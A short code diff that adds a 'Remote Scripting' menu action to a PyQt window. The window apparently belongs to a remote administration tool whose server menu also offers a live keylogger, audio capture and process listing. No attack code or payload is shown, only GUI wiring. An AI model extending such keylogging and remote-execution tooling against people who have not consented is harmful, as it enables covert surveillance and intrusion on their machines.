@@ -451,6 +451,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                                       lambda: self.run_plugin('audioMode'))
                 server_menu.addAction(QIcon(os.path.join(assets, 'mkeylogger.png')), 'Live Keylogger',
                                       lambda: self.run_plugin('keyloggerMode'))
+                server_menu.addAction(QIcon(os.path.join(assets, 'script.png')), 'Remote Scripting',
+                                      lambda: self.run_plugin('scriptingMode'))
                 server_menu.addAction(QIcon(os.path.join(assets, 'mprocesses.png')), 'Processes',
                                       lambda: self.run_plugin('processesMode'))
 
